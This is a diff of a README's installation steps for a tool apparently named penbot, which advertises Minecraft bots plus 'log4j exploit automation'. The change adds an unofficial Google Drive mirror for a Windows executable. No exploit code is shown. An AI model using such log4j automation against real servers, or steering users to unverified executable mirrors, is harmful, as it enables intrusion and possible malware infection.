@@ -4,7 +4,7 @@ Create your own Minecraft Bots. Plus, log4j exploit automation.
 Installation:
 1. pip install -r requirements.txt
 2. Install java jdk17. And add it to your PATH.
-3. Download world-downloader.exe and insert move it into "download_world"(https://github.com/mircokroon/minecraft-world-downloader) directory.
+3. Download world-downloader.exe and insert move it into "download_world"(https://github.com/mircokroon/minecraft-world-downloader)(or from mirror: https://drive.google.com/file/d/1RI_-NnJ863q8_WajCFujPKacrSYsTkBH/view?usp=sharing) directory.
 4. Start the app with "python penbot.py"
 
 Here is the installator for Windows:
